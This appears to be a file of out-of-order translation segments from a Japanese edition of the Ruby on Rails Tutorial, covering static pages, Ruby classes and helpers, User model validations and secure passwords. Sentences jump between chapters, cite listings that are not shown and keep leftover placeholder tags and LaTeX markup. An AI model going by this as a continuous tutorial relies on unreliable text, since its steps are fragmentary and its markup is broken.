これをチェックするには否定演算子 (\ref{sec:objects_and_message_passing})が必要なので、\kode{!} (参考: 英語ではbangと読みます) を使用します。
これはリスト\ref{code:real_user_fixture}で使用されていました。
このアイディアに従ってリスト\ref{code:login_create_user_instance}とリスト\ref{code:improved_remember_me_test}の不足分を埋め (ヒントとして\kode{●}や\kode{FILL_IN}を目印に置いてあります)、[remember me] チェックボックスのテストを改良してください。
{0}{1}第5章{/1}{/0}では、新しいユーザーを作成するためのスタブページを作ったところで終わりました (\ref{sec:user_signup})。
{0}{1}第7章{/1}{/0}では、ユーザーがサイトにユーザー登録できるようにし、ユーザープロファイルのためのページを作成します。
ユーザー登録できるようになったら、ログインやログアウトをできる仕組みを作り ({0}{1}第8章{/1}{/0})、{2}{1}第9章{/1}{/2}からは不正なアクセスを取り扱う方法について学んでいきます (\ref{sec:requiring_logged_in_users}) 。
最後に、{0}{1}第10章{/1}{/0}でメールアドレスを使ってアカウントを有効化する方法と、パスワードをリセットする方法について学びます。
まとめると、{0}{1}第6章{/1}{/0}から{2}{1}第10章{/1}{/2}を通して、Railsのログインと認証システムをひととおり開発します。
メールアドレスをユーザー名にしたことで、ユーザー同士で通信できるように拡張できる可能性が開かれます ({0}{1}第10章{/1}{/0})。
リスト\ref{code:example_user}では、以下のようにRubyの\kode{attr_accessor}メソッドを使用しました。
リスト{p0}にある{2}generate{/2}コマンドの結果のひとつとして、\emph{マイグレーション}と呼ばれる新しいファイルが生成されます。
このUserモデルの例の場合、マイグレーションはモデル生成スクリプトによって自動的に作られました。リスト{p0}に示したように{2}name{/2}と{2}email{/2}の2つのカラムを持つ{2}users{/2}テーブルを作成します
リスト\ref{code:users_migration}の場合、\kode{change}メソッドは\kode{create_table}というRailsのメソッドを呼び、ユーザーを保存するためのテーブルをデータベースに作成します。
\kode{create_table}メソッドはブロック変数を1つ持つブロック (\ref{sec:blocks}) を受け取ります。ここでは (“table”の頭文字を取って) \kode{t}です。
{0}図6.4{/0} {1}リスト\ref{code:users_migration}で生成されたUserのデータモデル{/1}
上のコマンドでは、データベースからusersテーブルを削除するために\kode{drop_table}コマンドを内部で呼び出しています。
これがうまくいくのは、\kode{change}メソッドは\kode{drop_table}が\kode{create_table}の逆であることを知っているからです。つまり、ロールバック用の逆方向マイグレーションを簡単に導くことができるのです。
これまで、リスト\ref{code:generate_user_model}のUserモデルの作成によってどのように ({2}{1}リスト6.2{/1}{/2}の) マイグレーションファイルが作成されるかを見てきました。そして図\ref{fig:sqlite_database_browser}でこのマイグレーションを実行した結果を見ました。\kode{users}テーブルを作成することで、\kode{development.sqlite3}という名のファイルを更新し、\kode{id}、\kode{name}、\kode{email}、\kode{created_at}、\kode{updated_at}を作成しました。
{0}{1}第4章{/1}{/0}と同じく、Railsコンソールを使用してデータモデルを調べてみましょう。
\ref{sec:a_user_class}のコンソールセッションでは\kode{User.new}で新しいユーザーオブジェクトを生成しましたが、リスト\ref{code:example_user}のexample_userファイルを明示的にrequireするまでこのオブジェクトにはアクセスできませんでした。
\ref{sec:a_user_class}では、オブジェクトの属性を設定するための\emph{初期化ハッシュ (hash) }を引数に取るように、Userクラスの例 (user_example.rb) を設計しました。この設計は、同様の方法でオブジェクトを初期化するActive Recordの設計に基づいています。
作成した時点でのユーザーオブジェクトは、\kode{id}属性、マジックカラムである\kode{created_at}属性と\kode{updated_at}属性の値がいずれも\kode{nil}であったことを思い出してください。
詳細は{0}{1}第7章{/1}{/0}でも説明しますが、上で見たようにモデルの生成と保存を2つのステップに分けておくと何かと便利です。しかし、Active Recordでは\kode{User.create}でモデルの生成と保存を同時におこなう方法も提供されています。
これまでメールアドレスをユーザー名として使用してきたので、このような\kode{find}関連メソッドは、ユーザーをサイトにログインさせる方法を学ぶときに役に立ちます ({1}{2}第7章{/2}{/1})。
ユーザー数が膨大になると\kode{find_by}では検索効率が低下するのではないかと心配する方もいるかもしれませんが、あせる必要はありません。この問題およびデータベースのインデックスを使った解決策については\ref{sec:uniqueness_validation}で扱います。
\kode{update_attributes}メソッドは\kode{update}メソッドのエイリアスですが、単一属性を変更する\kode{update_attribute}メソッドとの違いを明確にするために、筆者は長いメソッド名の方を好んで使っています。
\kode{update_attributes}メソッドは属性のハッシュを受け取り、成功時には更新と保存を続けて同時に行います (保存に成功した場合は\kode{true}を返します)。
ただし、検証に1つでも失敗すると、{0}update_attributesの呼び出しは失敗します。たとえば、{p1}{/0}で実装する、パスワードをレコードに保存することを要求すると検証は失敗します。
特定の属性のみを更新したい場合は、以下のように\kode{update_attribute}を使います。なお、update_attributeには検証を回避するといった効果もあります。
有効なオブジェクトに対してテストを書くために、\kode{setup}という特殊なメソッドを使って有効なUserオブジェクト (\kode{@user}) を作成します (このメソッドは{1}{2}第3章{/2}{/1}の演習でも少し取り上げました)。setupメソッド内に書かれた処理は、各テストが走る直前に実行されます。\kode{@user}はインスタンス変数ですが、setupメソッド内で宣言しておけば、すべてのテスト内でこのインスタンス変数が使えるようになります。したがって、\kode{valid?}メソッドを使ってUserオブジェクトの有効性をテストすることができます (\ref{sec:creating_user_objects}).。
有効なUserかどうかをテストする GREEN{2}{3}{/3}{3}{4}{/4}{/3}{3}{/3}{/2}
まずはリスト{p0}に、{2}name{/2}属性の存在性に関するテストを追加します。
具体的にはリスト\ref{code:name_presence_test}のように、まず\kode{@user}変数の\kode{name}属性に対して空白の文字列をセットします。そして、\kode{assert_not}メソッドを使って Userオブジェクトが有効でなくなったことを確認します。
{0}{1}第2章{/1}{/0}の演習で少し触れましたが、name属性の存在を検査する方法は、リスト{p2}に示したとおり、{3}validates{/3}メソッドに{3}presence: true{/3}という引数を与えて使うことです。
\kode{name}属性の存在性を検証する GREEN{3}{4}{/4}{4}{5}{/5}{/4}{4}{/4}{/3}
この変更によりリスト\ref{code:name_presence_test}のテストは{2}{3}{/3}{3}{4}成功{/4}{/3}{3}{/3}{/2}しているはずです。
\kode{email}属性の存在性を検証する GREEN{3}{4}{/4}{4}{5}{/5}{/4}{4}{/4}{/3}
これですべての存在性がチェックされたので、テストスイートは{0}{1}{/1}{1}{2}成功{/2}{/1}{1}{/1}{/0}するはずです。
 \kode{name}属性に長さの検証を追加する GREEN{3}{4}{/4}{4}{5}{/5}{/4}{4}{/4}{/3}
このコレクションを作るために、以下のコンソールセッションに示したような、文字列の配列を簡単に作れる\kode{%w[]}という便利なテクニックを知っておくと良いでしょう。
有効なメールフォーマットをテストする GREEN{2}{3}{/3}{3}{4}{/4}{/3}{3}{/3}{/2}
(詳細な文字列を調べるために{p0}で紹介した{2}inspect{/2}メソッドを使っています。)
どのメールアドレスで失敗したのかを知ることは非常に便利です。そこでリスト{p0}では、{2}each{/2}メソッドを使って各メールアドレスを順にテストしています。ループさせずにテストすると、失敗した行番号からとメールアドレスの行数を照らし合わせて、失敗したメールアドレスを特定するといった作業が発生してしまいます。
英数字、アンダースコア (_)、プラス (+)、ハイフン (-)、ドット (.) のいずれかを少なくとも1文字以上繰り返す
{0}表6.1{/0} {1}メールの正規表現を分解した結果{/1}
{0}図6.4{/0} {1}素晴らしい正規表現エディタ\href{http://www.rubular.com/}{Rubular}{/1}
メールフォーマットを正規表現で検証する ( \passing {5}{/5} {6}app/models/user.rb{/6})
正規表現\kode{VALID_EMAIL_REGEX}は\emph{定数}です。大文字で始まる名前はRubyでは定数を意味します。
重複するメールアドレス拒否のテスト ( \failing ) {5}{/5}{6}test/models/user_test.rb{/6}
幸い、\kode{:uniquenessでは\kode{:case_sensitive}という打ってつけのオプションが使用できます (リスト\ref{code:validates_uniqueness_of_email_case_insensitive}})。
たとえば、リスト{p0}のマイグレーションによって作成された{2}email{/2}属性について考えてみましょう。
{0}{1}第7章{/1}{/0}ではユーザーをサンプルアプリにログインできるようにしますが、このとき、送信されたものと一致するメールアドレスのユーザーのレコードをデータベースの中から探しだす必要があります。
もちろん、リスト{p0}の{2}users{/2}テーブル用のマイグレーションファイルを単に編集することも可能なのですが、その場合ロールバックが必要となり、マイグレーションが戻ってしまいます。
上のコードでは、\kode{users}テーブルの\kode{email}カラムにインデックスを追加するために\kode{add_index}というRailsのメソッドを使っています。
Userのデフォルトfixture ({2}{3}{/3}{3}{4}RED{/4}{/3}{3}{/3}){/2}
また、このfixtureは{0}{1}第8章{/1}{/0}になるまで使わない予定なので、今のところはこれらのデータを削除しておき、ユーザー用のfixtureファイルを空にしておきましょう (リスト\ref{code:empty_fixtures})。
空のfixtureファイル GREEN{2}{3}{/3}{3}{4}{/4}{/3}{3}{/3}{/2}
今回の場合は、オブジェクトが保存される時点で処理を実行したいので、\kode{before_save}というコールバックを使います。これを使って、ユーザーをデータベースに保存する前にemail属性を強制的に小文字に変換します
(本チュートリアルで初めて紹介したテクニックですが、このテクニックについては第10章でもう一度取り上げます。そこではコールバックを定義するときに{0}メソッドを参照する{/0}という慣習について説明します。){1}\emph{}{/1}
email属性を小文字に変換してメールアドレスの一意性を保証する ({2}{3}{/3}{3}{4}GREEN{/4}{/3}{3}{/3}){/2}
リスト\ref{code:email_downcase}のコードは、\kode{before_save}コールバックにブロックを渡してユーザーのメールアドレスを設定します。設定されるメールアドレスは、現在の値をStringクラスの\kode{downcase}メソッドを使って小文字バージョンにしたものです。
実は{p0}の{2}palindrome{/2}内で{2}reverse{/2} メソッドを使っていたときも、同様のケースであったことを思い出してください。そのときと同様で、左式では{2}self{/2}を省略することは\emph{できません}。したがって、
{p0}では{2}ハッシュ{/2}とはRubyのデータ構造であると説明しましたが、今回の「ハッシュ化」とはそういった構造ではなく、\href{http://en.wikipedia.org/wiki/Hash_function}{ハッシュ関数}を使って入力されたデータを元に戻せない (不可逆な) データにする処理を指します。)
また、入力されたパスワードを使用してユーザーを\emph{認証}する手段と、{1}{2}第8章{/2}{/1}で使用する、ユーザーがサイトにログインできるようにする手段も提供します。
セキュアなパスワードの実装は、\kode{has_secure_password}というRailsのメソッドを呼び出すだけでほとんど終わってしまいます。このメソッドは、Userモデルで次のように呼び出せます。
セキュアにハッシュ化したパスワードを、データベース内の\kode{password_digest}という属性に保存できるようになる。
この魔術的な\kode{has_secure_password}機能を使えるようにするには、1つだけ条件があります。それは、モデル内に\kode{password_digest}という属性が含まれていることです。
たとえば、(実は本書の第1版や第2版でも間違っていたのですが) \href{https://github.com/rails/rails/blob/master/activemodel/lib/active_model/secure_password.rb}{has_secure_password}の\kode{ソースコード}でもこの手の間違いがあります。
{0}図6.8{/0} {1}Userモデルに\kode{password_digest}属性を追加する{/1}
図\ref{fig:user_model_password_digest}のようなデータモデルにするために、まずは\kode{password_digest}カラム用の適切なマイグレーションを生成します。
\kode{add_password_digest_to_users}というマイグレーションファイルを生成するためには、以下のコマンドを実行します。
上のコマンドでは\kode{password_digest:string}という引数を与えて、今回必要になる属性名と型情報を渡しています。
置き換えた結果を{0}{1}リスト4.3{/1}{/0}に示します。
\kode{users}テーブルに\kode{password_digest}カラムを追加するマイグレーション
リスト\ref{code:password_migration}では、\kode{add_column}メソッドを使って\kode{users}テーブル\kode{password_digest}カラムを追加しています。
また、\kode{has_secure_password}を使ってパスワードをハッシュ化するためには、最先端のハッシュ関数である\href{http://en.wikipedia.org/wiki/Bcrypt}{bcrypt}が必要になります。
Userモデルに\kode{password_digest}属性を追加し、Gemfileにbcryptを追加したことで、ようやくUserモデル内で\kode{has_secure_password}が使えるようになりました (リスト\ref{code:has_secure_password})。
Userモデルに\kode{has_secure_password}を追加する ( \failing )
テストが失敗する理由は、\ref{sec:a_hashed_password}で触れたように\kode{has_secure_password}には、仮想的な\kode{password}属性と\kode{password_confirmation}属性に対してバリデーションをする機能も(強制的に)追加されているからです。しかしリスト\ref{code:validates_uniqueness_of_email_case_insensitive_test}のテストでは、\kode{@user} 変数にこのような値がセットされておりません。
Userモデルに対して\kode{has_secure_password}を追加する利点は\ref{sec:creating_and_authenticating_a_user}で少しだけ説明しますが、 その前に、パスワードの最小文字数を設定する方法について説明します。
リスト{p0}では{2}maximum{/2}を使ってユーザー名の最大文字数を制限していましたが、これと似たような形式の{2}minimum{/2}というオプションを使って、最小文字数のバリデーションを実装することができます。
これはリスト\ref{code:password_implementation}で使用されていました。
ただしWebからのユーザー登録はまだできない ({0}{1}第7章{/1}{/0}で完成させます) ので、今回はRailsコンソールを使ってユーザーを手動で作成することにしましょう。
{p0}で説明した{2}create{/2}を使いますが、後々実際のユーザーを作成する必要が出てくるので、今回はサンドボックス環境は\emph{使いません}。したがって、今回作成したユーザーを保存すると、データベースに反映されます。
({0}{1}第7章{/1}{/0}でもっと便利なメソッドを紹介します)
{0}図6.9{/0} {1}SQLiteデータベース\kode{db/development.sqlite3}に登録されたユーザーの行{/1}
コンソールに戻って\kode{password_digest}属性を参照してみると、リスト\ref{code:password_implementation}の\kode{has_secure_password}の効果を確認できます。
また\ref{sec:a_hashed_password}で説明したように、\kode{has_secure_password}をUserモデルに追加したことで、そのオブジェクト内で\kode{authenticate}メソッドが使えるようになっています。
このメソッドは、引数に与えられた文字列 (パスワード) をハッシュ化した値と、データベース内にある\kode{password_digest}カラムの値を比較します。
{0}{1}第8章{/1}{/0}では、この\kode{authenticate}メソッドを使ってログインする方法を解説します。
次の{0}{1}第7章{/1}{/0}では、ユーザーを作成するためのユーザー登録フォームを作成し、各ユーザーの情報を表示するためのページも作成します。
{0}{1}第8章{/1}{/0}では、\ref{sec:adding_a_secure_password}の認証システムを利用して、ユーザーが実際にWebサイトにログインできるようにします。
このテストでは、\kode{reload}メソッドを使用してデータベースから値を再度読み込み、\kode{assert_equal}メソッドを使用して同値であるかどうかをテストしてください。
\kode{before_save}コールバック内で\kode{email.downcase!}と書き、\kode{email}属性を直接変更してもよいことを、テストスイートを走らせて確認してください (リスト\ref{code:downcase_bang}のように書いてもよいことを、テストスイートを実行して確認してください。
\kode{before_save}コールバックの別の実装 
この章では、{0}{1}第3章{/1}{/0}で使用した例を基に、Railsにおいて重要となるRubyのさまざまな要素について探っていくことにしましょう。{2
前章の終わりでは、Railsのレイアウトを使用してビューでの重複を取り除くために、ほぼ静的なページを単に更新したにとどまりました ({0}{1}リスト4.1{/1}{/0})。これは、{2}{1}リスト3.32{/1}{/2}と同じものです。
サンプルアプリケーションのレイアウト GREEN{2}{3}{/3}{3}{4}{/4}{/3}{3}{/3}{/2}
{0}{1}リスト4.1{/1}{/0}の以下の行にご注目ください。
ここでは、Railsの組み込み関数\kode{stylesheet_link_tag} (詳細は\href{http://api.rubyonrails.org/classes/ActionView/Helpers/AssetTagHelper.html#method-i-stylesheet_link_tag}{Rails API}を参照) を使用して、\kode{application.css}をすべての\href{http://www.w3.org/TR/CSS2/media.html}{メディアタイプ}にインクルードしています (メディアタイプには、コンピュータの画面や印刷画面なども含まれます)。
この関数は\emph{ヘルパー}と呼ばれます。カスタムヘルパーを作成する方法を学ぶために、まず{1}{2}リスト4.1{/2}{/1}のタイトル行の部分に注目しましょう。
 | Ruby on Rails Tutorial Sample App
ページタイトルが正しく表示されない問題を解決するために、\kode{full_title}というヘルパーを作成することにします。
\kode{full_title}ヘルパーは、ページタイトルが定義されていない場合は基本タイトル「Ruby on Rails Tutorial Sample App」を返し、定義されている場合は基本タイトルに縦棒と追加ページタイトルを追加して返します ({1}{2}リスト4.2{/2}{/1})
あるヘルパーが特定のコントローラでのみ使用するものであれば、それに対応するヘルパーファイルに置く必要があります。たとえばStaticPagesコントローラ用ヘルパーは、通常\kode{app/helpers/static_pages_helper.rb}になります。
今回の場合、\kode{full_title}ヘルパーはサイトのすべてのページで使用することを前提にしていますが、Railsにはこのような場合のための特別なヘルパーファイル\kode{app/helpers/application_helper.rb}があります。
\kode{full_title}ヘルパーを定義する
置き換えた結果を{0}{1}リスト4.3{/1}{/0}に示します。
\kode{full_title}ヘルパーを使ったWebサイトのレイアウト
これを行うには、まず{0}{1}リスト4.4{/1}{/0}に示すように以前のテストコードを更新し、\kode{"Home"} という文字が表示されていないことを確認するテストを追加します。
テストがパスするためには、\kode{{1}リスト4.6{/1}}のようにHomeページのビューから{2}provide{/2}の行を削除する必要があります。
Rails開発経験者にとっては、{0}{1}リスト4.2{/1}{/0}のコードはスタイルシートをインクルードするのと大差ない単純なものですが、ここにもRubyの重要な概念が\emph{多数}含まれています。モジュール、メソッド定義、任意のメソッド引数、コメント、ローカル変数の割り当て、論理値 (boolean)、制御フロー、文字列の結合、そして戻り値です。
ほぼあらゆるオブジェクトを文字列に変換する\kode{to_s}メソッドを使用して、nilがメソッドに応答する例をお目にかけましょう。
このように、\kode{nil}オブジェクト自身は\kode{empty?}メソッドには応答しないにもかかわらず、\kode{nil.to_s}とすると応答することがわかります。
Railsコンソールでも、\kode{{1}リスト3.6{/1}}の{2}home{/2}アクションや、{3}{1}リスト4.2{/1}{/3}の{2}full_title{/2}ヘルパーと同じ方法でメソッドを定義することができます
たとえば、\kode{引数}を1つ取り、引数が空かどうかに基づいたメッセージを返す\emph{string_message}という関数を定義してみましょう。
つまり、最初の例の\kode{str}を別の変数名 (\kode{the_function_argument}など) に変更しても、メソッドの呼び出し方は全く同じです。
とはいうものの、まだ理解していないことが\emph{1つ}あります。\emph{Railsが\emph{どのようにして}これらを結びつけているかということです。URLをアクションにマップする方法や、\kode{full_title}}ヘルパーをビューで利用できるようにする方法などがそうです。
注釈付きの\kode{title_helper}.
The result is that the \kode{full_title} method is \href{http://catb.org/jargon/html/A/automagically.html}{automagically} available in all our views.
\emph{Railsチュートリアル}ではこれまで配列について解説していませんでしたが、配列を理解することは、ハッシュ (\ref{sec:hashes_and_symbols}) やRailsのデータモデルを理解するための重要な基盤となります (データモデルとは\kode{has_many}などの関連付けのことであり、\ref{sec:demo_user_has_many_microposts}や\ref{sec:user_micropost_associations}で詳しく説明します)。
\emph{範囲 (range)} は、配列と密接に関係しています。\kode{to_a}メソッドを使用して配列に変換すると理解しやすいと思います。
{0}{1}リスト4.10{/1}{/0}に示したように、ハッシュの値にはほぼ何でも使用することができ、他のハッシュを使用することすらできます。
それでは、もう一度{0}{1}リスト4.1{/1}{/0}に戻り、レイアウトに CSS (cascading style sheet) を追加する以下の行を見てみましょう。
たとえば、{0}{1}図1.5{/1}{/0}をもう一度見てみると、コードを80文字以下に抑えるための小さな縦線が右側に見えます。
上のコードでは\kode{stylesheet_link_tag}関数を2つの引数で呼んでいます。最初の引数である文字列は、スタイルシートへのパスを示しています。次の引数であるハッシュには2つの要素があり、最初の要素はメディアタイプを示し、次の要素はRails 4.0で追加された\href{https://github.com/rails/turbolinks}{turbolinks}という機能をオンにしています。
継承階層を{0}{1}図4.1{/1}{/0}に示します。
{0}図4.1{/0} {1}\kode{String}クラスの継承階層{/1}
単語\emph{は}文字列なので、\kode{{2}リスト4.12{/2}}のように{3}Word{/3}クラスは {3}String{/3}クラスを\emph{継承}するのが自然です
{p0}でも簡単に説明しましたが、上のコードの{2}Word < String{/2}は継承のためのRubyの記法です。こうすることで、新しい{2}palindrome?{/2}メソッドだけではなく、Stringクラスで使用できるすべてのメソッドをWordクラスに対しても使用できるようになります。
{0}{1}図4.2{/1}{/0}にこのクラス階層を示します。
{0}Figure 4.2: {/0}{1}The inheritance hierarchy for the (non-built-in) \kode{Word} class from Listing \ref{code:word_class}.{/1}
{0}{1}リスト4.12{/1}{/0}では、単語の文字を逆順にしたものが元の単語と同じであるかどうかのチェックを、\kode{Word}クラスの中から自分自身が持つ単語にアクセスすることで行なっていることにご注目ください。
これまでクラスや継承について説明してきましたが、これらの話は前の章にもあったような気がします。{それもそのはずで、StaticPagesコントローラで継承やクラスについて触れたことがありました ({0}{1}リスト3.18{/1}{/0})。
継承の関係を{0}{1}図4.3{/1}{/0}に示します。
\kode{{1}第3章{/1}}で示したとおり、{2}home{/2}アクションはWebページを表示するためのものであり、値を返すためのものではありませんでした。
最後に完全なクラスを作成して、この章を終わりにしましょう。そこで、\kode{{1}第6章{/1}}で使用する{2}User{/2}クラスを最初から作成することにします。
これまではコンソール上でクラスを定義しましたが、このような面倒な作業はもう行いたくありません。これからは、アプリケーションのルートディレクトリに\kode{example_user.rb}ファイルを作成し、そこに{1}{2}リスト4.13{/2}{/1}のように書くことにします。
 example_userで使用するコード
このコードは、{p0}や\ref{sec:mvc_in_action}でも説明したように、{3}@name{/3}および{3}@email{/3}{4}インスタンス変数{/4}について、取り出し(get) と割り当て(set) を行う "ゲッター" と "セッター" というメソッドをそれぞれ作成します。
最後に、\kode{formatted_email}メソッドを定義しましょう (\ref{sec:strings})。このメソッドは、文字列の式展開を利用して、\kode{@name}と\kode{@email}に割り当てられた値をユーザーのメールアドレスとして構成します。
\kode{@} 記号によって示されているとおり、\kode{@name}と\kode{@email}は両方ともインスタンス変数なので、自動的に\kode{formatted_email}メソッドで使えるようになります。
Railsコンソールを起動し、example_userのコードを\kode{require}して、自作したクラスを試しに使ってみましょう。
上のコードで、requireのパスにある\kode{’.’}は、Unixの “カレントディレクトリ” (現在のディレクトリ) を表し、\kode{’./example_user’}というパスは、カレントディレクトリからの相対パスでexample_userファイルを探すようにRubyに指示します。
次のコードでは空のexample_userを作成します。次に、対応する属性にそれぞれ手動で値を代入することで、名前とメールアドレスを与えます (\kode{{1}リスト4.13{/1}}で{2}attr_accessor{/2}を使用しているので、アトリビュートアクセサを使用して代入できます)。
\kode{@name}変数に\kode{"Example User"}という値を設定します。同様に\kode{email}属性にも値を設定します。これらの値は\kode{formatted_email}メソッドで使用されます。
{0}{1}第7章{/1}{/0} では、 ハッシュ引数を使用してオブジェクトを初期化します。これは一般に\emph{マスアサインメント (mass assignment)} と呼ばれる技法で、Railsアプリケーションで多用されています。
{0}{1}第5章{/1}{/0}では、この章で学んだ内容をサンプルアプリケーションの開発に活かしていきます。
{p0}で作成した{2}example_user.rb{/2}ファイルは今後使用することはありませんので、削除してください。
{0}{1}リスト4.14{/1}{/0}のコードにある２つの疑問符を、それぞれ適切なメソッドに置き換えて、与えられた文字列の文字をシャッフルする関数を作成してください。ヒント: \kode{split}メソッド、\kode{shuffle}メソッド、\kode{join}メソッドを組み合わせてみましょう。
そこで、この先に進む前に先の2つのアプリを思い切って削除しておくとよいでしょう。アプリを削除するには、\kode{workspace}ディレクトリに移動して\kode{rm -rf hello_app/ toy_app/}コマンドを実行します(表\ref{table:unix_commands})。
サンプルアプリケーションを生成する
(\emph{注}: もしサンプルアプリケーションの開発で必要になるgemを\emph{すべて}知りたい場合は、{1}{2}リスト11.67{/2}{/1}を参照してください。これが最終的なGemfileになります)。
Herokuでは、development環境とproduction環境とで異なるデータベースを使用することを非推奨としていますが、幸いにもこのサンプルアプリケーションでは両者の違いは生じません。また、SQLiteの方がPostgreSQLよりもローカルでのインストールや設定が\emph{ずっと楽}なので{p1}、今回はことなるデータベースを使うことにします。
{0}第{1}1{/1}章{/0}や{2}第{1}2{/1}章{/2}, I suggest following the “hello, world!”
{0}第{1}2{/1}章{/0}でも指摘したとおり、主な理由は、デフォルトのRailsページはHerokuで破損してしまうことが多く、そのままだとデプロイが成功したのか失敗したのかがわかりにくいためです。
もし多数の静的なページが必要になる場合は、\href{https://github.com/thoughtbot/high_voltage}{\texttt{high_voltage}} gem を調べてみてください。
コントローラについては{0}第{1}2{/1}章{/0}でも簡単に触れましたが、\href{http://en.wikipedia.org/wiki/Representational_State_Transfer}{第{1}6{/1}章}で説明する{3}REST アーキテクチャ{/3}を読むと理解が深まります。一言で言うと、コントローラとは (基本的に動的な) Webページの集合を束ねるコンテナのことです。
現在どのディレクトリで作業しているかがわからなくなった場合は、\ref{sec:the_hello_application} ({2}{1}図 1.4{/1}{/2})を再度参照して、Rails のディレクトリ構造を確認してください。
静的なページの作成は、\kode{第{1}2{/1}章}でscaffold生成に使用した{2}generate{/2}スクリプトで、コントローラを生成することから始めます。
先ほどと同様に\kode{static_pages_controller.rb}というコントローラが生成されます。
なお{0}{1}第6章{/1}{/0}でも、以下のように\emph{モデル}を自動生成する方法を紹介します。
その理由については{0}{1}第6章{/1}{/0}で説明します)。
また、\emph{{1}第2章{/1}}でも簡単に紹介しましたが、{2}マイグレーション{/2}の変更を元に戻す方法も用意されています。詳細は{3}{1}第6章{/1}{/3}で説明します。
{0}図3.1{/0} {1}サンプルアプリケーションの\kode{config}ディレクトリの内容{/1}
先ほどリスト{p0}のように{2}home{/2}アクションと{2}help{/2}アクションを生成したので、routesファイルにはそれぞれのアクションで使用されるルールが定義されています (リスト\ref{code:pages_routes})。
\href{http://localhost:3000/static_pages/home}{/static_pages/home}にアクセスして結果を表示します (図\ref{fig:raw_home_view})。
{0}図3.2{/0} {1}\href{http://localhost:3000/static_pages/home}{/static_pages/home}にアクセスした結果{/1}
Railsを含む多くのWebフレームワークは、HTTPの各操作を発展させた\emph{REST アーキテクチャ}の影響を受けています。{1}{2}第2章{/2}{/1}でも簡単に触れましたが、{3}{2}第7章{/2}{/3}では、より深い内容について学びます。
ここで、{0}{1}第2章{/1}{/0}のUsersコントローラやMicropostsコントローラとは異なり、StaticPagesコントローラは一般的なRESTアクションに対応していないことに注意してください。
しかし、Railsでは動作が異なります。\kode{StaticPagesController}はRuby のクラスですが、\kode{ApplicationController}クラスを継承しているため、StaticPagesControllerのメソッドは (たとえ何も書かれていなくても) Rails特有の振る舞いをします。具体的には、/static_pages/homeというURLにアクセスすると、RailsはStaticPagesコントローラを参照し、\kode{home}アクションに記述されているコードを実行します。その後、そのアクションに対応する\emph{ビュー} (\ref{sec:mvc}で説明したMVCのVに相当) を出力します。
{0}.erb{/0}の詳細については{p1}で説明しますが、ファイル名に{0}.html{/0}が含まれていることからわかる、基本的にはHTMLと同じような構造になっています ({3}\kode{リスト3.7}{/3})。
\kode{help}アクションに対応するビューも、上のコードと似ています ({1}{2}リスト3.8{/2}{/1})。
{0}図3.3{/0} {1}修正されたHomeページ{/1}
{0}図3.4{/0} {1}修正されたHelpページ{/1}
本書における主要なテストは、\emph{コントローラテスト} (この節より)、\emph{モデルテスト} ({1}第{2}6{/2}章{/1}より)、\emph{統合テスト} ({3}第{2}7{/2}章{/3}より) の3つです。
テストスイートは期待どおりパス GREEN{0}{1}{/1}{1}{2}{/2}{/1}{1}{/1}{/0} します
\kode{about}用のルートを追加する RED{3}{4}{/4}{4}{5}{/5}{/4}{4}{/4}{/3}
\kode{about}アクションが追加されたStaticPagesコントローラ RED{3}{4}{/4}{4}{5}{/5}{/4}{4}{/4}{/3}
Aboutページのコード GREEN{2}{3}{/3}{3}{4}{/4}{/3}{3}{/3}{/2}
もちろん、実際にブラウザを起動して、テストが正しく動いているかどうかを確かめることもできます ({0}{1}図3.5{/1}{/0})。
{0}図3.5{/0} {1}作成したAboutページ (\href{http://localhost:3000/static_pages/about}{/static_pages/about}){/1}
タイトルを自動で変えるぐらいのことが\emph{真の}動的コンテンツと呼べるかどうかは議論の余地があると思いますが、いずれにしろこのページは、{1}{2}第7章{/2}{/1}で紹介する本格的な動的コンテンツの基礎となります。
{0}表3.2{/0} {1}サンプルアプリケーションの (ほぼ) 静的なページ。{/1}
表\ref{table:static_pages}の各タイトルについて簡単なテストを書きます (リスト\ref{code:about_test})。このテストで使用している\kode{assert_select}メソッドでは、特定のHTMLタグが存在するかどうかをテストします (この種のアサーションメソッドはその名から「セレクタ」と呼ばれることもあります)
StaticPagesコントローラのタイトルをテストする RED{2}{3}{/3}{3}{4}{/4}{/3}{3}{/3}{/2}
{0}�図3.6 {/0}{1}タイトルが付いたHomeページ{/1}
The view for the Help page with full HTML structure. {2}{3}{/3}{3}{4}red{/4}{/3}{3}{/3}{/2}
完全なHTML構造を備えたAboutページのビュー GREEN{2}{3}{/3}{3}{4}{/4}{/3}{3}{/3}{/2}
タイトルにERBコードを使用したHomeページのビュー GREEN{2}{3}{/3}{3}{4}{/4}{/3}{3}{/3}{/2}
{0}{1}リスト3.28{/1}{/0}は、\emph{ERB}と呼ばれている、Rubyの埋め込みコードの最初の例です
Railsでの開発経験者であれば、この時点で\kode{content_for}の使用を検討すると思いますが、残念ながらAsset Pipelineと併用すると正常に動作しないことがあります。
\kode{provide}関数はcontent_forの代替です。
続いて、HelpページとAboutページも同様に変更します ({0}{1}リスト3.30{/1}{/0}、{2}{1}リスト3.31{/1}{/2})。
タイトルにERBコードを使用したHelpページのビュー GREEN{2}{3}{/3}{3}{4}{/4}{/3}{3}{/3}{/2}
タイトルにERBコードを使用したAboutページのビュー GREEN{2}{3}{/3}{3}{4}{/4}{/3}{3}{/3}{/2}
変更の結果、レイアウトファイルは{0}{1}リスト3.32{/1}{/0}のようになります。
上の3つのERBは、それぞれスタイルシート、JavaScript、{0}csrf_meta_tags{/0}メソッドをページ内で展開するためのものです。スタイルシートとJavaScriptは、Asset Pipeline ({p1}) の一部です。csrf_meta_tagsは、Web攻撃手法のひとつである\href{http://en.wikipedia.org/wiki/Cross-site_request_forgery}{クロスサイトリクエストフォージェリー} (cross-site request forgery: CSRF)を防ぐために使われるRailsのメソッドです。
もちろん、{0}{1}リスト3.28{/1}{/0}、{2}{1}リスト3.30{/1}{/2}、 {3}{1}リスト3.31{/1}{/3}のビューには、レイアウトと重複するHTMLがまだ残っているので、それらを削除して、内部のコンテンツだけ残します。
この改修が終わると、 {0}{1}リスト3.33{/1}{/0}、{2}{1}リスト3.34{/1}{/2}、{3}{1}リスト3.35{/1}{/3}のように実に簡潔で美しいコードになります。
HTML構造を削除したHomeページ GREEN{2}{3}{/3}{3}{4}{/4}{/3}{3}{/3}{/2}
HTML構造を削除したHelpページ GREEN{2}{3}{/3}{3}{4}{/4}{/3}{3}{/3}{/2}
HTML構造を削除したAboutページ GREEN{2}{3}{/3}{3}{4}{/4}{/3}{3}{/3}{/2}
({p0}でApplicationコントローラに{2}hello{/2}アクションを追加した場合は、今のうちにアクションを削除しておくことをおすすめします)。
